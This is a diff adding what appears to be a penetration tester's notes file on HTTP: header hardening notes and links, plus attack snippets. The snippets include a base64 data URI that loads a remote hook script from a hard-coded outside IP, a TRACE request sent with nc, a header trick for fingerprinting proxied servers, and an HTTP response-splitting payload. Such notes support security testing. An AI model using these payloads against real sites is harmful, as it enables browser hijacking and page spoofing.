@@ -1,0 +1,52 @@
+# http
+
+# X-Content-Security-Policy, Strict-Transport-Security, X-Frame-Options
+http://www.dsd.gov.au/publications/csocprotect/protecting_web_apps.htm
+
+# CORS (Access-Control-Allow-Origin)
+https://ejj.io/breaking-sop/
+
+# bypass same origin (SOP)
+use data uri like data:text/html;base64,PGh0bWw+CjxzY3JpcHQgc3JjPSAiaHR0cDovLzEwNC4xMzEuNS4xNTA6ODAwMC9ob29rLmpzIjsgIHR5cGU9ICJ0ZXh0L2phdmFzY3JpcHQiID48L3NjcmlwdD4KPC9odG1sPgo=
+
+# http://guides.rubyonrails.org/security.html
+X-Frame-Options 'SAMEORIGIN' in Rails by default - allow framing on same domain. Set it to 'DENY' to deny framing at all or 'ALLOWALL' if you want to allow framing for all website.
+X-XSS-Protection '1; mode=block' in Rails by default - use XSS Auditor and block page if XSS attack is detected. Set it to '0;' if you want to switch XSS Auditor off(useful if response contents scripts from request parameters)
+X-Content-Type-Options 'nosniff' in Rails by default - stops the browser from guessing the MIME type of a file.
+X-Content-Security-Policy A powerful mechanism for controlling which sites certain content types can be loaded from
+Access-Control-Allow-Origin Used to control which sites are allowed to bypass same origin policies and send cross-origin requests.
+Strict-Transport-Security Used to control if the browser is allowed to only access a site over a secure connection
+
+# if there's a reverse proxy removing the Server: try to send http header with invalid values like with the Expect: header
+# BigIP <-> Tomcat
+GET /blah/ HTTP/1.1
+Connection: Keep-Alive
+User-Agent: Mozilla/5.0
+Host: foobar
+Expect: 101-continue             // != 100-continue
+
+HTTP/1.1 400 Bad Request
+Server: Apache-Coyote/1.1        // would not be returned with 100-continue
+Transfer-Encoding: chunked
+Date: Wed, 03 Jul 2013 07:52:02 GMT
+X-Cnection: close
+
+# methode TRACE / TRACK
+# http://deadliestwebattacks.com/2010/05/18/cross-site-tracing-xst-the-misunderstood-vulnerability/
+$ echo -ne 'TRACE /kikool HTTP/1.1\r\nHost: 10.0.0.10\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n' | nc -n 127.0.0.1 80
+HTTP/1.1 200 OK
+Date: Tue, 16 Jul 2013 06:26:11 GMT
+Server: Apache/2.4.4 (Fedora) OpenSSL/1.0.1e-fips PHP/5.4.16
+Transfer-Encoding: chunked
+Content-Type: message/http
+
+TRACE /kikool HTTP/1.1
+Host: 10.10.220.230
+Accept: */*
+User-Agent: Mozilla/5.0
+
+# http response splitting
+language=fr%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a<html>Sorry,%20System%20Down</html>
+
+# websockets
+https://www.notsosecure.com/blog/2014/11/27/how-cross-site-websocket-hijacking-could-lead-to-full-session-compromise/
